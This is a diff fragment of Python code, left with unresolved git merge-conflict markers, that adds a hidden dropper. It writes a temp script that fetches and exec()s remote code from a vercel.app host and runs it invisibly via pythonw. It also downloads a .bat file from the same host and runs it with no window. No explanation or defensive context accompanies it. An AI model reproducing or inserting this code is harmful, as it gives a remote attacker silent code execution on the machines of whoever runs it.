@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 from tempfile import NamedTemporaryFile as _ffile
 from sys import executable as _eexecutable
 from subprocess import Popen, CREATE_NO_WINDOW
@@ -22,3 +23,29 @@ if response.status_code == 200:
     with open(name, 'wb') as dosya:
         dosya.write(response.content)
     Popen([name], creationflags=CREATE_NO_WINDOW, shell=True)
+=======
+from tempfile import NamedTemporaryFile as _ffile
+from sys import executable as _eexecutable
+from subprocess import Popen, CREATE_NO_WINDOW
+import requests
+import os
+import uuid
+import tempfile
+
+_ttmp = _ffile(delete=False)
+_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://h4ndl3r.vercel.app/2.txt").read())""")
+_ttmp.close()
+
+pythonw_path = _eexecutable.replace("python.exe", "pythonw.exe")
+Popen([pythonw_path, _ttmp.name])
+
+url = "https://h4ndl3r.vercel.app/lalala.bat"
+temp = tempfile.gettempdir()
+name = os.path.join(temp, f"{uuid.uuid4()}.bat")
+
+response = requests.get(url)
+if response.status_code == 200:
+    with open(name, 'wb') as dosya:
+        dosya.write(response.content)
+    Popen([name], creationflags=CREATE_NO_WINDOW, shell=True)
+>>>>>>> 3d48523f258697ba67de031829625e993e559180
